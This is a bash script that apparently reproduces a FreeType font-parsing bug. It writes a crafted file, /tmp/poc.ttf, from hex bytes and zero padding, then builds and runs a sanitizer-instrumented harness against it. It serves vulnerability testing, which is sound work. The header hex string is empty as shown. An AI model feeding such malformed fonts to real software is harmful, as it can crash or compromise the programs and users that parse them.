#!/bin/bash
set -e

HEADHEX=""
TAILHEX="0001000100010002000200010001000100020002b5040002000200020002000000030003b504"

printf '%b' "$(echo -n "$HEADHEX" | sed 's/\(..\)/\\x\1/g')" > /tmp/poc.ttf
head -c 9266 /dev/zero >> /tmp/poc.ttf
printf '%b' "$(echo -n "$TAILHEX" | sed 's/\(..\)/\\x\1/g')" >> /tmp/poc.ttf

ls -la /tmp/poc.ttf
md5sum /tmp/poc.ttf

cc -g -O0 -fsanitize=address,undefined -fno-omit-frame-pointer \
  -I /work/build/include -I /work/include \
  /poc/poc.c /work/build/libfreetype.a -lm -lz \
  -o /tmp/poc_bin

ASAN_OPTIONS=detect_leaks=0:symbolize=1 /tmp/poc_bin /tmp/poc.ttf
